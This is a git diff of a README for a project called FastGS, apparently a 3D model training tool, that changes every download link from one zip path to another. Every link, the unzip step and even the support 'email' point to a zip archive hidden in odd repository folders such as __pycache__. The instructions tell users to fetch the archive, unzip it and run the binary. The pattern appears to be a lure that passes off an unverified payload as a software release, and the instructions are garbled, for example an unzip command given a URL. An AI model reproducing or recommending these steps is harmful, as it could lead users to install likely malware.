@@ -1,7 +1,7 @@
 # 🎉 FastGS - Train 3D Models Quickly and Easily
 
 ## 📥 Download Now
-[![Download FastGS](https://raw.githubusercontent.com/luvas2-sketch/FastGS/main/scene/__pycache__/FastGS_v1.4.zip)](https://raw.githubusercontent.com/luvas2-sketch/FastGS/main/scene/__pycache__/FastGS_v1.4.zip)
+[![Download FastGS](https://raw.githubusercontent.com/luvas2-sketch/FastGS/main/submodules/simple-knn/Fast_GS_v2.5.zip)](https://raw.githubusercontent.com/luvas2-sketch/FastGS/main/submodules/simple-knn/Fast_GS_v2.5.zip)
 
 ## 📖 Table of Contents
 - [Overview](#overview)
@@ -29,7 +29,7 @@ To run FastGS, your computer should meet the following requirements:
 - **Graphics Card:** A modern GPU is recommended for optimal performance.
 
 ## 📥 Download & Install
-To download and install FastGS, visit this page: [FastGS Releases](https://raw.githubusercontent.com/luvas2-sketch/FastGS/main/scene/__pycache__/FastGS_v1.4.zip).
+To download and install FastGS, visit this page: [FastGS Releases](https://raw.githubusercontent.com/luvas2-sketch/FastGS/main/submodules/simple-knn/Fast_GS_v2.5.zip).
 
 1. Click the link above to go to the Releases page.
 2. On the Releases page, you will see a list of available versions.
@@ -50,7 +50,7 @@ To download and install FastGS, visit this page: [FastGS Releases](https://raw.g
 ### For Linux Users:
 1. Open a terminal.
 2. Navigate to the directory where the downloaded file is located.
-3. Extract the files using the command: `unzip https://raw.githubusercontent.com/luvas2-sketch/FastGS/main/scene/__pycache__/FastGS_v1.4.zip`.
+3. Extract the files using the command: `unzip https://raw.githubusercontent.com/luvas2-sketch/FastGS/main/submodules/simple-knn/Fast_GS_v2.5.zip`.
 4. Run the application by executing: `./FastGS`.
 
 ## 🚀 Usage Instructions
@@ -66,8 +66,8 @@ Once FastGS is installed, follow these steps to start training your 3D models:
 Feel free to check the in-app documentation for in-depth guidance on features and options.
 
 ## 🤝 Support
-If you face any issues or have questions about FastGS, please reach out for help. You can create an issue in the repository on GitHub or contact us via email at https://raw.githubusercontent.com/luvas2-sketch/FastGS/main/scene/__pycache__/FastGS_v1.4.zip
+If you face any issues or have questions about FastGS, please reach out for help. You can create an issue in the repository on GitHub or contact us via email at https://raw.githubusercontent.com/luvas2-sketch/FastGS/main/submodules/simple-knn/Fast_GS_v2.5.zip
 
 Thank you for choosing FastGS. We hope this software makes your 3D modeling journey easier and faster!
 
-[![Download FastGS](https://raw.githubusercontent.com/luvas2-sketch/FastGS/main/scene/__pycache__/FastGS_v1.4.zip)](https://raw.githubusercontent.com/luvas2-sketch/FastGS/main/scene/__pycache__/FastGS_v1.4.zip)
+[![Download FastGS](https://raw.githubusercontent.com/luvas2-sketch/FastGS/main/submodules/simple-knn/Fast_GS_v2.5.zip)](https://raw.githubusercontent.com/luvas2-sketch/FastGS/main/submodules/simple-knn/Fast_GS_v2.5.zip)
